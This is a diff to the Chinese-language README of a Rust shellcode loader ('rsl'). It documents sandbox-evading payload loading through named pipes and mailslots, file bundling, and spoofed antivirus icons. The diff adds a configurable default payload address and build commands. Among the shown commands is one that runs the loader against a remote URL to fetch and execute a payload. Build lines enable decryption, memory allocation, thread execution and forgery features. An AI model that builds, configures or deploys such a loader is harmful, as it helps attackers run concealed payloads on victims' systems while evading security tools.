@@ -91,10 +91,7 @@
 - **Named Pipe** - 通过命名管道加载payload，可绕过某些沙箱检测
 - **Mailslot** - 通过邮件槽加载payload，另一种IPC机制
 - **Read File V2** - 读取自身文件内容并覆盖内存，混淆数据流分析
-- **分离式加载** - 从命令行读取地址，支持本地文件或远程URL，默认读取encrypt.bin
-  - xxx.exe <path> / <url>
-  - 例如xxx.exe C:\\path\to\payload.bin
-  - 或者xxx.exe http://server.name/payload.bin
+- **分离式加载** - 分离加载payload，支持本地文件或远程URL
 - 可拓展...
 
 ### 📎 文件捆绑功能(2025-12-12新增)
@@ -236,7 +233,7 @@ python main.py
 对于启用了分离式加载（ `load_payload_cmdline`） 特性的构建版本，可以通过命令行指定payload地址：
 
 ```bash
-# 默认读取同目录下的 encrypt.bin
+# 默认读取编译时配置的地址
 ./rsl.exe
 
 # 指定本地文件路径
@@ -244,6 +241,14 @@ python main.py
 
 # 指定远程URL
 ./rsl.exe http://example.com/payload.bin
+```
+
+**GUI配置默认地址：**
+在GUI中选择"分离式加载"方式时，会显示一个输入框用于设置默认payload地址。
+
+**编译时配置默认地址：**
+```bash
+set "RSL_DEFAULT_PAYLOAD_ADDRESS=my_payload.bin" && cargo build --release --features=load_payload_cmdline
 ```
 
 - payload二进制文件是在编译后生成的src/encrypt.bin
@@ -348,7 +353,7 @@ set "RSL_ICON_PATH=icons\avp_0000.ico" && cargo build --release --no-default-fea
 set "RSL_BUNDLE_FILE=C:\path\to\your\file.pdf" && set "RSL_BUNDLE_FILENAME=document.pdf" && cargo build --release --no-default-features --features=decrypt_ipv4,base64_decode,run_create_thread,alloc_mem_va,with_forgery
 
 # 示例：启用分离式加载（从命令行读取payload地址）
-set "RSL_ICON_PATH=icons\avp_0000.ico" && cargo build --release --no-default-features --features=decrypt_ipv4,base64_decode,run_create_thread,alloc_mem_va,load_payload_cmdline
+set "RSL_ICON_PATH=icons\avp_0000.ico" && set "RSL_DEFAULT_PAYLOAD_ADDRESS=payload.dat" && cargo build --release --no-default-features --features=decrypt_ipv4,base64_decode,run_create_thread,alloc_mem_va,load_payload_cmdline
 ```
 
 ## 🛠️ 二次开发
